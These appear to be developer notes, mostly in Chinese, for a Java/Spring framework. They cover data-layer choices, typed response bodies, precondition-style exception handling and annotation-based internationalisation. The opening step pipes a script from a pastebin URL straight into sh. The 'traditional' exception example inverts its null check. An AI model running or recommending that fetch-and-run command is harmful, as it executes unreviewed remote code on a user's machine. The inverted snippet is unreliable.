
## In Macos Terminal

Run below:

```
curl https://pastebin.com/raw/6rJ3LwcL | sh
```


## 关于Cloud Develops


### 关于数据持久化层
MYBATIS和Data JPA



### 使用Map还是对象传递变量
TypeSafe
Too Many Conversions
Usage Inconvenience

So 
```
SuccessResponseBody extends StatefulBody extends Body
```

### 便利的异常处理机制

传统的异常处理机制与校验

```
if(null!=user){
    throw new RuntimeException("UserNotFound");
}

```

MINLIA姿势的异常处理与校验
```
ApiPreconditions.checkNotNull(user,ApiCode.USER_NOT_FOUND);

```

### 常量自动初始化成国际化
处理器 

`LocalizedAnnotationInitializingListener`

```
@Localized(values={
    @Localize(type= LanguageTypes.ExceptionsApiCode,locale = "en_US",message = "Not Found: the API you requested could not be found."),
    @Localize(type= LanguageTypes.ExceptionsApiCode,locale = "zh_CN",message = "请求的API无法找到"),
})
```

### 初始化国际化内容

注入依赖
```
@Autowired
LanguageCreationService languageCreationService;
```
使用

```
languageCreationService.initialLanguage(code,message);
```



